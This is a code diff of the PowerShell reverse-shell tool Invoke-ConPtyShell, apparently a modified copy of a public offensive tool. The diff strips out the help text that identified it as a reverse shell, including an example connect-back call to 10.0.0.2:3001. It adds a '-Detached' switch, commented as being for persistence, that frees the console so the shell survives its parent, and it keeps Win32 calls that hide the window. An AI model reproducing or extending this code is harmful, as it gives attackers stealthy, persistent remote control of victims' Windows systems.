@@ -1,39 +1,5 @@
 function Invoke-ConPtyShell
 {   
-    <#
-        .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows (Modified - Hidden Window)
-            Author: splinter_code (Modified to spawn hidden)
-            License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
-        
-        .DESCRIPTION
-            Modified version that spawns with a hidden console window
-            
-        .PARAMETER RemoteIp
-            The remote ip to connect
-        .PARAMETER RemotePort
-            The remote port to connect
-        .PARAMETER Rows
-            Rows size for the console
-            Default: "24"
-        .PARAMETER Cols
-            Cols size for the console
-            Default: "80"
-        .PARAMETER CommandLine
-            The commandline of the process that you are going to interact
-            Default: "powershell.exe"
-        .PARAMETER Hidden
-            Spawn with hidden window (added parameter)
-            
-        .EXAMPLE  
-            PS>Invoke-ConPtyShell 10.0.0.2 3001 -Hidden
-            
-            Description
-            -----------
-            Spawn a hidden reverse shell
-            
-    #>
     Param
     (
         [Parameter(Position = 0)]
@@ -62,34 +28,52 @@ function Invoke-ConPtyShell
 
         [Parameter()]
         [Switch]
-        $Hidden
+        $Hidden,
+
+        [Parameter()]
+        [Switch]
+        $Detached  # New parameter for persistence
     )
     
-    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
-        $RemoteIp = "upgrade"
-        $RemotePort = "shell"
-    }
-    else{
-  
-        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
-            throw "RemoteIp missing parameter"
-        }
-        
-        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
-            throw "RemotePort missing parameter"
-        }
-    }
-
-    # If hidden parameter is specified, hide the PowerShell window
-    if ($Hidden) {
+    # If hidden or detached, hide the window and make it independent
+    if ($Hidden -or $Detached) {
         Add-Type -Name Window -Namespace Console -MemberDefinition '
         [DllImport("Kernel32.dll")]
         public static extern IntPtr GetConsoleWindow();
         [DllImport("user32.dll")]
         public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        [DllImport("kernel32.dll")]
+        public static extern bool FreeConsole();
+        [DllImport("kernel32.dll")]
+        public static extern bool AllocConsole();
         '
-        $consolePtr = [Console.Window]::GetConsoleWindow()
-        [Console.Window]::ShowWindow($consolePtr, 0)
+        
+        # If Detached, free the console to prevent it from dying when parent closes
+        if ($Detached) {
+            [Console.Window]::FreeConsole()
+            # Don't allocate a new one - let ConPtyShell handle its own console
+        }
+        
+        # If just Hidden (or both), hide the existing window
+        if ($Hidden) {
+            $consolePtr = [Console.Window]::GetConsoleWindow()
+            if ($consolePtr -ne [IntPtr]::Zero) {
+                [Console.Window]::ShowWindow($consolePtr, 0)
+            }
+        }
+    }
+
+    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
+        $RemoteIp = "upgrade"
+        $RemotePort = "shell"
+    }
+    else{
+        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
+            throw "RemoteIp missing parameter"
+        }
+        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
+            throw "RemotePort missing parameter"
+        }
     }
 
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
